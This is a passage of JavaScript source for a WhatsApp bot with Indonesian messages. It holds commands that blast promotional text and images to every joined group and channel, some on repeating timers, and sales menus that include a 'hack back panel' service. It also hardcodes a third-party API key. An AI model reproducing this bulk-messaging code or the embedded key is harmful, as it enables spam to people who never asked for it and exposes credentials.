listidch.splice(0, listidch.length)
await fs.writeFileSync("./storage/database/listidch.json", JSON.stringify(listidch))
return reply(`Berhasil menghapus semua id channel dari database ✅`)
}
if (!text.endsWith("@newsletter")) return reply("Id channel tidak valid")
let input = text
if (!listidch.includes(input)) return reply(`Id ${input2} tidak terdaftar!`)
const pos = listidch.indexOf(input)
listidch.splice(pos, 1)
await fs.writeFileSync("./storage/database/listidch.json", JSON.stringify(listidch, null, 2))
reply(`Berhasil menghapus id channel dari database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listidch": case "listch": {
if (listidch.length < 1) return reply("Tidak ada id channel di database")
let teks = ` *── List all id channel*\n`
for (let i of listidch) {
teks += `\n* ${i}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: loli})
}
break

case "jpmchfoto": {
    if (!isCreator) return reply(mess.owner)
    if (!text) return reply("Balas/kirim foto dengan teks");
    if (!/image/.test(mime)) return reply("Format salah! Balas/kirim foto dengan teks.");
    
    let image = await client.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [
        "120363333324119584@newsletter",
        "120363359546649119@newsletter",
    ];
    let total = 0;

    reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await client.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayjpmch); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break;

case "jpmallch": case "jpmch": {
    if (!isCreator) return reply(mess.owner) // Periksa apakah pengguna adalah creator
 if (!text) return reply(example("teksnya")); // Periksa apakah teks tersedia
 
 // Daftar saluran WhatsApp (array berisi ID saluran WhatsApp)
 const daftarSaluran = [
"120363333324119584@newsletter",
        "120363359546649119@newsletter",
 ];

 // Kirim pesan ke semua saluran dalam daftar
 for (const idSaluran of daftarSaluran) {
 try {
 await client.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
 } catch (error) {
 console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
 }
 }
 reply("*DONE JPM KE SEMUA CH*");
}
break

case "jpmallch2": {
    if (!isCreator) return reply(mess.owner) // Periksa apakah pengguna adalah creator
    if (!text) return reply("Format: Jpmallch2 jumlah_pesan|waktu|teks");

    // Memisahkan parameter
    const [jumlahPesan, waktu, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali
    const daftarSaluran = [
        "120363333324119584@newsletter",
        "120363359546649119@newsletter",
    ];

    // Validasi parameter
    if (!jumlahPesan || isNaN(jumlahPesan) || !waktu || isNaN(waktu) || !teks) {
        return reply("Format salah! Gunakan: Jpmallch2 jumlah_pesan|waktu|teks");
    }

    const jumlah = parseInt(jumlahPesan);
    const interval = parseInt(waktu) * 60 * 1000; // Konversi menit ke milidetik

    reply(`*Mengirim ${jumlah} pesan setiap ${waktu} menit ke daftar saluran...*`);

    let counter = 0;

    // Fungsi pengiriman pesan dengan interval
    const pengirimanPesan = setInterval(async () => {
        if (counter >= jumlah) {
            clearInterval(pengirimanPesan); // Hentikan pengiriman setelah selesai
            return reply("*DONE JPM KE SEMUA CH 😜🤙🏻*");
        }

        for (const idSaluran of daftarSaluran) {
            try {
                await client.sendMessage(idSaluran, { text: teks });
            } catch (error) {
                console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
            }
        }

        counter++;
    }, interval);
}
break;

//================================================================================

case "jpmslide": {
if (!isCreator) return reply(mess.owner)
let allgrup = await client.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await client.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: loli})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return reply(mess.owner)
let allgrup = await client.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await client.sendMessage(jid, {text: `*Jpm Telah Selsai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: loli})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("teksnya"))
let allgrup = await client.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await client.sendMessage(i, {text: `${teks}`}, {quoted: loli})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await client.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: loli})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teks dengan mengirim foto"))
const allgrup = await client.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await client.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await client.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: loli})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `*Jpm Telah Selesai*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: loli})
}
break

//================================================================================
case "jpmtesti": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teks dengan mengirim foto"))
const allgrup = await client.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await client.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await client.sendMessage(i, {
  footer: `${botname2}\nJpm Testimoni`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Layanan',
          sections: [
            {
              title: 'List Layanan',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Reseller Panel Pterodactyl',
                  id: '.buyresellerpanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps Digital Ocean',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                },
                {
                  title: 'Jasa Install Theme',
                  id: '.jasainstalltema'
                },
                {
                  title: 'Jasa Hack Back Panel',
                  id: '.jasahbpanel'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `${teks}`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: loli})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: loli})
}
break

case "sendtesti": case "testi": {
if (!isCreator) return reply(global.mess.owner)
if (!text) return reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teks dengan mengirim foto"))
const allgrup = await client.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await client.downloadAndSaveMediaMessage(qmsg)
await reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await client.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await client.sendMessage(i, {
  footer: `${botname2}\nSend Testimoni`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Reseller Panel Pterodactyl',
                  id: '.buyresellerpanel'
                },
                {
                  title: 'Jasa Hack Back Panel',
                  id: '.jasahbpanel'
                },
                {
                  title: 'Jasa install thema',
                  id: '.jasainstalltema'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps Digital Ocean',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `${teks}`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: loli})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await client.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: loli})
}
break

case 'mlstalk': {
     if (!text || !text.split("|")) return reply(example("id|zone"));
 let vii = text.split("|");
 
 let id = vii[0].trim(); 
 let zone = vii[1].trim(); 

    try {
        let epep = await fetchJson(`https://api.neoxr.eu/api/gname-ml?id=${id}&zone=${zone}&apikey=zakkigans12`);
        let caption = `*MOBILE LEGENDS STALK*\nid : ${id}\nzone : ${zone}\nNickName : ${epep.data.username}`;

        reply(caption);
    } catch (err) {
        reply('Username Tidak Ditemukan.');
    }
}
break;

case 'ffstalk': {
    if (!text) return reply(`Contoh: ${prefix+command} id`);
    if (isNaN(text)) return reply(`ID harus berupa angka!`);

    try {
        let epep = await fetchJson(`https://api.neoxr.eu/api/gname-ff?id=${text}&apikey=zakkigans12`);
        let caption = `*FREE FIRE STALK*\nid : ${text}\nNickName : ${epep.data.username}`;

        reply(caption);
    } catch (err) {
        reply('Username Tidak Ditemukan.');
    }
}
break;

//================================================================================

case "pay": case "payment": case "qris": {
await client.sendMessage(m.chat, {
  footer: `${botname2}\nALL PAYMENT`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },              
                {
                  title: 'GOPAY',
                  id: '.gopay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: global.image.qris}, 
  caption: "\n*[ ! ] Penting :* Wajib kirimkan bukti transfer demi keamanan bersama\n"
}, {quoted: loli})
}
break

//================================================================================

case "dana": {
if (!isCreator) return
let teks = `
*Payment Dana ${global.namaowner}*

* *Nomor :* ${global.dana}
* *Atas Nama :* ${global.namadana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
}
break

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaowner}*

* *Nomor :* ${global.gopay}
* *Atas Nama :* ${global.namagopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await client.sendMessage(m.chat, {text: teks}, {quoted: loli})
}
break

//================================================================================

case "ambilq": case "q": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Channel :*
${linkChannel}`
await client.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdreply: {
title: `Dana Masuk🔥`, 
body: `© Powered By ${namaowner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(example("vps r16 c4"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await client.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdreply: {
title: `Transaksi Done⚡`, 
body: `Powered By ${namaowner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "depeloperrbot": case "depeloperr": {
await client.sendContact(m.chat, [global.owner], loli)
}
break

case "owner":
			case "developerbot": {
				let namaown = `𝐃𝐚𝐧𝐧𝐲 𝐒𝟖𝐗`
				var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
					"contactMessage": {
						"displayName": `${namaown}`,
						"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.owner}:+${global.owner}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐒𝐢𝐦𝐩𝐥𝐞 𝐁𝐨𝐭 𝐕𝟏𝟏\nX-WA-BIZ-NAME: [[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
					}
				}), {
					userJid: m.chat,
					quoted: loli
				})
				client.relayMessage(m.chat, contact.message, {
					messageId: contact.key.id
				})
			}
			break


//================================================================================

case "save": case "sv": {
if (!isCreator) return
await client.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "self": {
if (!isCreator) return
client.public = false
reply("Succes Change To *Self*")
}
break

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.quoted) return reply("reply pesannya")
if (m.quoted.fromMe) {
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return reply(mess.botAdmin)
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply(example("reply pesan"))
client.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//================================================================================

case "getcase": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./system/DannyS8X.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
reply(`${getcase(q)}`)
} catch (e) {
return reply(`Case *${text}* tidak ditemukan`)
}
}
break

case 'getcase2': {
if (!isCreator) return reply(mess.owner);
if (!text) return reply(`Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return reply(`Format tidak valid. Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return reply(`Untuk mode '1', masukkan satu case name. Contoh: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return reply(`Untuk mode '2', masukkan satu atau dua case names. Contoh: ${prefix+command} 2 caseName1 caseName2\nNote: Jika Error Case Tidak Ditemukan Maka karena beda pref`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile("./system/DannyS8X.js", "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return reply(`Terjadi kesalahan: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => reply(caseCode))
.catch(error => reply(`Terjadi kesalahan: ${error.message}`));
break;
}

//================================================================================

case "runtime": {
    let uptime = process.uptime();
    let hours = Math.floor(uptime / 3600);
    let minutes = Math.floor((uptime % 3600) / 60);
    let seconds = Math.floor(uptime % 60);
    
    await client.sendMessage(m.chat, { 
        pollResultMessage: { 
            name: "Runtime Info", 
            pollVotes: [
                {
                    optionName: "Runtime (Hours)",
                    optionVoteCount: hours
                },
                {
                    optionName: "Runtime (Minutes)",
                    optionVoteCount: minutes
                },
                {
                    optionName: "Runtime (Seconds)",
                    optionVoteCount: seconds
                }
            ] 
        } 
    }, { quoted: loli });
}
break;

case "script":
case "sc": {
    await client.sendMessage(m.chat,{
        productMessage: {
            title: "𝐒𝐢𝐦𝐩𝐥𝐞 𝐁𝐨𝐭 𝐕𝟏𝟏 𝐏𝐫𝐨",
            description: "Ini adalah deskripsi produk",
            thumbnail: { url: "https://files.catbox.moe/y885wb.jpg" },
            productId: "PROD001",
            retailerId: "RETAIL001",
            url: "https://github.com/TamaXzz/Baileys",
            body: "the script is here",
            footer: `${footer}`,
            priceAmount1000: 777,
            currencyCode: "IDR",
            buttons: [
                {
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "GitHub",
                        url: "https://github.com/TamaXzz/Baileys"
                    })
                }
            ]
        }
    }, { quoted: loli });
}
break;

case "info": {
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    
    const usedGB = Math.floor(usedMem / 1024 / 1024 / 1024);
    const totalGB = Math.floor(totalMem / 1024 / 1024 / 1024);
    
    let timestamp = Date.now();
    let latensi = Date.now() - timestamp;

    await client.sendMessage(m.chat, { 
        pollResultMessage: { 
            name: "System Info", 
            pollVotes: [
                {
                    optionName: "Speed (ms)",
                    optionVoteCount: Math.max(1, Math.floor(latensi)) 
                },
                {
                    optionName: "RAM Used (GB)",
                    optionVoteCount: usedGB
                },
                {
                    optionName: "Total RAM (GB)",
                    optionVoteCount: totalGB
                }
            ] 
        } 
    }, { quoted: loli });
}
break

//================================================================================

case "public": {
if (!isCreator) return
client.public = true
reply("Succes Change To *Public*")
}
break

case "clsesi": case "clearsession": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./storage/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./storage/database/sampah/" + u)
}
reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//================================================================================

case "upchannel": case "upch": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("teksnya"))
await client.sendMessage(idSaluran, {text: text})
reply("Berhasil mengirim pesan *teks* ke dalam channel whatsapp")
}
break

//================================================================================

case "upchannel2": case "upch2": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return reply(example("teksnya dengan mengirim foto"))
let img = await client.downloadAndSaveMediaMessage(qmsg)
await client.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//================================================================================


case "resetdb": case "rstdb": {
if (!isCreator) return reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
reply("Berhasil mereset database")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return reply(mess.owner)
client.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return reply("Tidak ada owner tambahan")
let teks = `\n *[ ! ] List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: loli})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return reply(example("628xx"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./storage/database/owner.json", JSON.stringify(owners, null, 2))
reply(`The Number ${input2} Has Been Removed From Owner!`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return reply('*Example : .addowner 628xx*')
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./storage/database/owner.json", JSON.stringify(owners, null, 2))
reply(`The Number ${input2} Has Been Owner!`)
}
break

case 'cweb':
case 'createweb': {
  if (!isCreator) return reply(mess.owner)
  if (!text) return reply(example("nama web"))
  if (!qmsg || !/zip|html/.test(qmsg.mimetype)) return reply('reply file .zip atau .html')

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
  const domainCheckUrl = `https://${webName}.vercel.app`

  try {
    const check = await fetch(domainCheckUrl)
    if (check.status === 200) return reply(`❌ Nama web *${webName}* sudah digunakan. Silakan gunakan nama lain.`)
  } catch (e) {}

  const quotedFile = await client.downloadMediaMessage(qmsg)
  const filesToUpload = []

  if (qmsg.mimetype.includes('zip')) {
    const unzipper = require('unzipper')
    const zipBuffer = Buffer.from(quotedFile)
    const directory = await unzipper.Open.buffer(zipBuffer)

    for (const file of directory.files) {
      if (file.type === 'File') {
        const content = await file.buffer()
        const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/')
        filesToUpload.push({
          file: filePath,
          data: content.toString('base64'),
          encoding: 'base64'
        })
      }
    }

    if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
      return reply('File index.html tidak ditemukan dalam struktur ZIP.')
    }

  } else if (qmsg.mimetype.includes('html')) {
    filesToUpload.push({
      file: 'index.html',
      data: Buffer.from(quotedFile).toString('base64'),
      encoding: 'base64'
    })
  } else {
    return reply('File tidak dikenali. Kirim file .zip atau .html.')
  }

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`,
    'Content-Type': 'application/json'
  }

  await fetch('https://api.vercel.com/v9/projects', {
    method: 'POST',
    headers,
    body: JSON.stringify({ name: webName })
  }).catch(() => {})

  const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
    method: 'POST',
    headers,
    body: JSON.stringify({
      name: webName,
      project: webName,
      files: filesToUpload,
      projectSettings: { framework: null }
    })
  })

  const deployData = await deployRes.json().catch(() => null)
  if (!deployData || !deployData.url) {
    console.log('Deploy Error:', deployData)
    return reply(`Gagal deploy ke Vercel:\n${JSON.stringify(deployData)}`)
  }

  reply(`✅ Website berhasil dibuat!\n\n🌐 URL: https://${webName}.vercel.app`)
}
break

case 'scweb':
case 'ambilkodeweb': {
    if (!isCreator) return reply(mess.owner);
    if (!text) return reply(`Contoh: ${prefix + command} https://example.com`);

    try {
        let res = await fetch(text);
        if (!res.ok) return reply('❌ Gagal mengambil data dari URL tersebut');
        let html = await res.text();

        const filePath = path.join(__dirname, './temp/html_dump.html');
        fs.writeFileSync(filePath, html);

        await client.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'text/html',
            fileName: 'source.html'
        }, { quoted: loli });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        reply('❌ Terjadi kesalahan saat mengambil HTML\n'+e.message);
    }
}
break;

case 'listweb': {
if (!isCreator) return reply(mess.owner)
  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  const res = await fetch('https://api.vercel.com/v9/projects', { headers })
  const data = await res.json()

  if (!data.projects || data.projects.length === 0) return reply('Tidak ada website yang ditemukan.')

  let teks = '*🌐 Daftar Website Anda:*\n\n'
  for (let proj of data.projects) {
    teks += `• ${proj.name} → https://${proj.name}.vercel.app\n`
  }

  reply(teks)
}
break

case 'createscript':
case 'createsc': {
  (async () => {
    if (!isCreator) return reply(mess.owner);
    let path = require("path");
    let AdmZip = require("adm-zip");
    let fs = require("fs");
    let fetch = require("node-fetch");
    let crct = fs.readFileSync("./source/media/Xyz.jpg");
    let txtcrct = `\n--- Gunakan format: ---\n\`${prefix+command} <namaBot>|<namaOwner>|<Versi script>|<Password>|<fitur1>,<fitur2>,...\`\n\n--- Contoh : ---\n*${prefix+command} tama|tamatzy|V1|12345|brat,qc,play,pinterest*\n`;

    const args = text.split('|');
    if (args.length < 5) {
      return client.sendMessage(m.chat, { image: { url: crct }, caption: txtcrct }, { quoted: loli });
    }

    const mycfitur = require('../storage/casefitur.json');
    const [botName, ownerName, botVersion, password, featuresStr] = args;
    let features = featuresStr.split(',').map(f => f.trim());
    if (features.includes("allfitur")) features = mycfitur.map(f => f.name);

    reply(`🗂 *Process Script Created*\n> [ \`${botName}\` ]`);

    const mediaFireAPI = 'https://api.siputzx.my.id/api/d/mediafire?url=https://www.mediafire.com/file/4tvn38pcwm6684i/RLBasesZ.zip/file';
    const fixLink = "https://files.catbox.moe/tdquuz.zip"

    try {
      let res = await fetch(fixLink);
      let buffer = await res.arrayBuffer();
      let tempZipPath = './temp/disini.zip';
      // PERBAIKAN ERROR DI SINI
      fs.writeFileSync(tempZipPath, Buffer.from(buffer));

      let zip = new AdmZip(tempZipPath);
      let extractPath = `./temp/extracted_${m.pushName || 'user'}`;
      zip.extractAllTo(extractPath, true);

      const casePath = `${extractPath}/case.js`;
      let caseContent = fs.readFileSync(casePath, 'utf-8');
      let validFeatures = [];

      for (let feature of features) {
        let data = mycfitur.find(f => f.name === feature);
        if (!data) {
          reply(`⚠ *Fitur "${feature}" tidak ditemukan!*`);
          continue;
        }

        if (!caseContent.includes(data.function)) {
          caseContent = data.function + '\n' + caseContent;
        }

        if (!caseContent.includes(data.casenya)) {
          caseContent = caseContent.replace('switch (command) {', `switch (command) {\n${data.casenya}`);
        }

        if (data.upFile?.length > 0) {
          for (let file of data.upFile) {
            let filePath = Object.keys(file)[0];
            let fileContent = file[filePath];
            let fullPath = path.join(extractPath, filePath);
            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
            fs.writeFileSync(fullPath, fileContent, 'utf-8');
          }
        }

        validFeatures.push(feature);
        await new Promise(r => setTimeout(r, 500));
      }

      fs.writeFileSync(casePath, caseContent, 'utf-8');

      const updateText = (filePath, updates) => {
        let text = fs.readFileSync(filePath, 'utf-8');
        for (let [pattern, replacement] of updates) {
          text = text.replace(new RegExp(pattern, 'g'), replacement);
        }
        fs.writeFileSync(filePath, text, 'utf-8');
      };

      updateText(`${extractPath}/connection.js`, [[`const pw = ".*?";`, `const pw = "${password}";`]]);
      updateText(`${extractPath}/settings.js`, [
        [`global.owner = .*`, `global.owner = "${m.sender.split('@')[0]}";`],
        [`global.namabot = .*`, `global.namabot = '${botName}';`],
        [`global.ownername = .*`, `global.ownername = '${ownerName}';`],
        [`global.botversion = .*`, `global.botversion = '${botVersion}';`]
      ]);

      fs.writeFileSync(`${extractPath}/database/owner.json`, JSON.stringify([m.sender.split('@')[0]]), 'utf-8');

      const listMenuPath = `${extractPath}/storage/listmenu.json`;
      let menu = fs.existsSync(listMenuPath) ? JSON.parse(fs.readFileSync(listMenuPath)) : [];
      validFeatures.forEach(f => { if (!menu.includes(f)) menu.push(f) });
      fs.writeFileSync(listMenuPath, JSON.stringify(menu, null, 2), 'utf-8');

      let newZip = new AdmZip();
      newZip.addLocalFolder(extractPath);
      let outputZip = `./temp/sc_${m.pushName || 'user'}.zip`;
      newZip.writeZip(outputZip);

